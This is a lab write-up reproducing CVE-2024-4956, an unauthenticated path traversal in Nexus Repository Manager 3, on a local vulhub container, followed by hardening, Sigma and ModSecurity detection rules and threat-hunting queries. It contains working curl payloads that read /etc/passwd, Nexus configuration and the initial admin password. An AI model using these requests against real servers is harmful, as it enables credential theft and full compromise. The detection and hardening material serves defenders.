# CVE-2024-4956 — Nexus Repository Manager 3 Unauthenticated Path Traversal

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2024-4956 |
| Product | Sonatype Nexus Repository Manager 3 < 3.68.1 |
| Attack Vector | Network (Pre-Auth, single GET request) |
| Impact | Arbitrary File Read |
| CVSS 3.1 | 7.5 High |
| Patch | 3.68.1 |

Nexus Repository Manager 3 uses Jetty as its embedded web server. Jetty's `URIUtil.canonicalPath()` treats an empty path segment as the root directory, allowing an attacker to craft a URL with encoded slashes (`%2F`) followed by `..%2F` sequences to escape the web root and read arbitrary files on the system — without any authentication.

## 2. Attack Chain

```
Recon: Identify Nexus on port 8081 (default landing page)
  └─▶ Craft: URL-encoded path traversal /%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd
      └─▶ Deliver: Single GET request (no auth, no headers needed)
          └─▶ Impact: Read any file readable by nexus user (configs, credentials, keys)
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/nexus/CVE-2024-4956
docker compose up -d
# Nexus 3.68.0 on port 8081, wait ~90s for Java startup
```

### Step 1 — Read /etc/passwd via Path Traversal

```bash
curl -s "http://localhost:8081/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
# root:x:0:0:root:/root:/bin/bash
# ...
# nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false
```

The URL decodes to `///////../../../../../../etc/passwd`. Jetty's `URIUtil.canonicalPath()` treats the leading empty segments (`//`) as root, then the `../` sequences traverse out of the web root.

### Step 2 — Read Nexus Configuration

```bash
curl -s "http://localhost:8081/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fsonatype%2Fsonatype-work%2Fnexus3%2Fetc%2Fnexus.properties"
# Jetty and Nexus configuration exposed
```

### High-Value Targets for Attackers

```bash
# Admin password (initial)
curl -s "http://localhost:8081/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fsonatype%2Fsonatype-work%2Fnexus3%2Fadmin.password"
# Database credentials, API tokens in nexus.properties
# OrientDB files in sonatype-work/nexus3/db/
```

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **URL normalization bugs are a recurring class**: Jetty's `URIUtil.canonicalPath()` treating empty path segments as root is the same pattern as Spring CVE-2018-1271 — parser inconsistencies between proxy/server layers create traversal opportunities.
- **Encoded traversal bypasses naive filters**: The payload uses `%2F` (/) and `..%2F` (../) to bypass path filters that only check decoded strings or literal `../` sequences.
- **File read → full compromise**: Reading `admin.password`, OrientDB files, or Nexus API tokens from disk leads directly to authenticated admin access → plugin upload → RCE.
- **No authentication required**: The traversal works on the static resource handler which has no auth check — the entire filesystem is exposed to anonymous users.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to Nexus ≥ 3.68.1 |
| Reverse Proxy | Normalize and reject URLs containing `..`, `%2e`, `%2f` before forwarding to Nexus |
| Network | Never expose Nexus directly to internet; restrict to internal CI/CD networks |
| Filesystem | Run Nexus as dedicated low-privilege user; restrict read access to sensitive files via filesystem permissions |
| Container | Read-only rootfs, mount only necessary volumes, drop capabilities |

### 5.2 Detection (SIEM / WAF Rules)

```yaml
# Sigma rule — Nexus path traversal
title: Nexus CVE-2024-4956 Path Traversal
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs-uri-stem|contains:
      - '%2F%2F'
      - '%2f%2f'
      - '..%2F'
      - '..%2f'
    c-ip|not: '127.0.0.1'
  filter:
    cs-uri-stem|contains: '/repository/'
  condition: selection
  level: high
```

```
# ModSecurity rule
SecRule REQUEST_URI "@rx %2[fF].*\.\.%2[fF]" \
  "id:2024049561,phase:1,deny,status:403,\
   msg:'CVE-2024-4956 Nexus Path Traversal attempt'"
```

### 5.3 Threat Hunting

| Hypothesis | Data Source | Query Logic |
|------------|-------------|-------------|
| Path traversal exploitation | WAF / access logs | Requests with `%2F%2F` + `..%2F` patterns targeting port 8081 |
| Credential theft | Nexus audit log | Login with admin credentials from new IP shortly after traversal attempts |
| Config file exfiltration | Response size anomaly | GET responses from Nexus returning content matching `/etc/passwd` or `.properties` patterns |
| Post-compromise plugin upload | Nexus API logs | Plugin/task creation via REST API from previously-unseen admin session |

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | Single GET request exploit |
| docker / vulhub | Local vulnerable environment |

- [Sonatype Advisory — CVE-2024-4956](https://support.sonatype.com/hc/en-us/articles/29416509323923)
- [NVD — CVE-2024-4956](https://nvd.nist.gov/vuln/detail/CVE-2024-4956)
- [Orange Tsai — Breaking Parser Logic (BlackHat 2018)](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic.pdf)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
